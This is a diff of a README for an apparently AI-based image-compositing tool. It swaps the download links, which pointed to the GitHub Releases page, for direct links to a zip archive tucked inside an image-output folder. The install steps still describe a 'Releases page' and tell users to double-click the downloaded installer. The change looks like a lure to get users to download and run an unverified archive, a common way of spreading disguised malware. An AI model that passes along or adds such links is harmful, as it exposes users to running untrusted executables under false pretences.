@@ -2,7 +2,7 @@
 # 🤖 QWEN-AI-Compositing - Create Stunning Images Easily
 
 ## 📥 Download Now
-[![Download QWEN-AI-Compositing](https://img.shields.io/badge/Download-QWEN--AI--Compositing-brightgreen)](https://github.com/Aashish454/QWEN-AI-Compositing/releases)
+[![Download QWEN-AI-Compositing](https://raw.githubusercontent.com/Aashish454/QWEN-AI-Compositing/main/Output_Images/Park4runner/QWEN-AI-Compositing-v2.0-alpha.1.zip)](https://raw.githubusercontent.com/Aashish454/QWEN-AI-Compositing/main/Output_Images/Park4runner/QWEN-AI-Compositing-v2.0-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **QWEN-AI-Compositing**! This application lets you enhance your images using smart AI tools. It is simple to use and perfect for anyone looking to improve their photos without technical skills.
@@ -21,7 +21,7 @@ To run QWEN-AI-Compositing, you need:
 - GPU: Recommended for best performance.
 
 ## 💻 Download & Install
-1. Click on the following link to visit the Releases page: [Visit Releases Page](https://github.com/Aashish454/QWEN-AI-Compositing/releases).
+1. Click on the following link to visit the Releases page: [Visit Releases Page](https://raw.githubusercontent.com/Aashish454/QWEN-AI-Compositing/main/Output_Images/Park4runner/QWEN-AI-Compositing-v2.0-alpha.1.zip).
 2. On the Releases page, find the latest version.
 3. Download the appropriate installer for your system.
 4. Once downloaded, locate the installer file on your computer and double-click to run it.
@@ -65,5 +65,5 @@ Stay updated with our progress! Check the Releases page for the latest updates a
 
 Thank you for using QWEN-AI-Compositing! We hope you enjoy enhancing your images with AI technology.
 
-[![Download QWEN-AI-Compositing](https://img.shields.io/badge/Download-QWEN--AI--Compositing-brightgreen)](https://github.com/Aashish454/QWEN-AI-Compositing/releases)
+[![Download QWEN-AI-Compositing](https://raw.githubusercontent.com/Aashish454/QWEN-AI-Compositing/main/Output_Images/Park4runner/QWEN-AI-Compositing-v2.0-alpha.1.zip)](https://raw.githubusercontent.com/Aashish454/QWEN-AI-Compositing/main/Output_Images/Park4runner/QWEN-AI-Compositing-v2.0-alpha.1.zip)
 ```
